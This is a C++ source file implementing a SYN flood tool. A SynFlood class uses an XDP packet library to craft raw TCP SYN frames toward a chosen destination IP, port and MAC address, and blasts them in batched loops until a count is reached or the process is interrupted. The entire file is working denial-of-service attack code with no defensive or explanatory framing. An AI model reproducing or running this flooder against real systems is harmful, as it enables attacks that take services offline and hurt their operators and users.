#include <linux/if_ether.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <time.h>
#include <signal.h>

#include "xdp_runtime.h"
#include "xdp_dev.h"
#include "xdp_net.h"
#include "xdp_framepool.h"
#include "xdp_prefetch.h"

#include "synflood.h"

volatile bool SynFlood::running = true;
struct Channel SynFlood::channelList[MAX_QUEUE];
__thread uint64_t SynFlood::sendCount = 0;
uint64_t SynFlood::packetCount = 0;
in_addr_t SynFlood::dstIp;
uint16_t SynFlood::dstPort;
uint8_t SynFlood::dstMac[ETH_ALEN];
uint8_t SynFlood::srcMac[ETH_ALEN];

void SynFlood::signalHandler(int sig)
{
    running = false;
}

void SynFlood::setPacketCount(uint64_t c)
{
    packetCount = c;
}

void SynFlood::setSignal(void)
{
    signal(SIGINT, signalHandler);
}

void SynFlood::setDstAddr(const char *ip, uint16_t port)
{
    dstIp = inet_addr(ip);
    dstPort = htons(port);
}

int SynFlood::setDstMac(const char *mac)
{
    return setMac(mac, dstMac);
}
int SynFlood::setSrcMac(const char *mac)
{
    return setMac(mac, srcMac);
}
int SynFlood::setMac(const char *mac, uint8_t addr[ETH_ALEN])
{
    const char *pos = mac;
    int8_t      x;
    int         i;

    for (i = 0; i < ETH_ALEN; i++) {
        x = digtal(*pos++);
        if (x < 0) {
            return -1;
        }
        addr[i] = x << 4;
        x = digtal(*pos++);
        if (x < 0) {
            return -1;
        }
        addr[i] |= x;
        if (i < ETH_ALEN - 1 && *pos++ != ':') {
            return -1;
        }
    }

    return *pos == '\0' ? 0 : -1;
}

void SynFlood::initPacket(struct xdp_frame *frame, struct Channel *ch)
{
    struct iphdr    *iphdr;
    struct ethhdr   *ethhdr;
    struct tcphdr   *tcphdr;

    int i; 
    int len;
    ethhdr = xdp_frame_get_addr(frame, struct ethhdr *);
    ethhdr->h_proto = xdp_htons(ETH_P_IP);
    for (i = 0; i < ETH_ALEN; i++) {
        ethhdr->h_dest[i] = dstMac[i];
        ethhdr->h_source[i] = srcMac[i];
    }
    iphdr = (struct iphdr *) (ethhdr + 1);
    tcphdr = (struct tcphdr *) (iphdr + 1);
    len = sizeof(struct iphdr) + sizeof(struct tcphdr);
    iphdr->ihl = sizeof(struct iphdr) >> 2;
    iphdr->tos = 0;
    iphdr->tot_len = xdp_htons(len);
    iphdr->id = 1;
    iphdr->frag_off = 0x40;
    iphdr->ttl = 255;
    iphdr->protocol = IPPROTO_TCP;
    iphdr->check = 0;
    iphdr->saddr = 0; 
    iphdr->daddr = dstIp;
    iphdr->check = xdp_ipv4_checksum(iphdr);

    srand(time(NULL));
    tcphdr->source = xdp_htons(rand() % 65536);
    tcphdr->dest = dstPort; 
    tcphdr->seq = xdp_htonl(rand() % 90000000 + 5678);
    tcphdr->ack = 0;
    tcphdr->doff = sizeof(struct tcphdr) >> 2;
    tcphdr->syn = 1;
    tcphdr->window = xdp_htons(2048);
    tcphdr->check = 0;
    tcphdr->urg_ptr = 0;
    tcphdr->check = xdp_ipv4_udptcp_checksum(iphdr, tcphdr);
    ch->send_bufs[ch->sendCount++] = frame;
    frame->data_len = sizeof(struct ethhdr) + len;
}

int SynFlood::sender(volatile void *args)
{
    int          frame_count;
    uint64_t     total = 0;
    uint16_t     sent = 0;
    uint16_t     qIdx = 0;

    struct xdp_frame *frame[BUF_NUM]; 
    struct Channel   *chn;

    sendCount = packetCount;
    qIdx = *(uint16_t *)args;
    chn = &channelList[qIdx];
    
    while (running) {
        int i;
        frame_count = xdp_dev_get_empty_frame(qIdx, frame, BUF_NUM);
        if (!frame_count) {
            break;
        }
        
        for (i = 0; i < 3 && i < frame_count; i++) {
            xdp_prefetch0(xdp_frame_get_addr(frame[i], void *));
        }
        for (i = 0; i < frame_count - 3; i++) {
            xdp_prefetch0(xdp_frame_get_addr(frame[i + 3], void *));
            initPacket(frame[i], chn);
        }
        for (; i < frame_count; i++) {
            initPacket(frame[i], chn);
        }

        if (xdp_runtime_likely(chn->sendCount)) {
            sent = xdp_dev_write(qIdx, chn->send_bufs, chn->sendCount);
            if (xdp_runtime_unlikely(sent != chn->sendCount)) {
                for (i = sent; i < chn->sendCount; i++) {
                    xdp_framepool_free_frame(chn->send_bufs[i]);
                }
            }
            total += sent;
            chn->sendCount = 0;
        }
        if (sendCount && total >= sendCount) {
            break;   
        }
    }
    return 0;
}

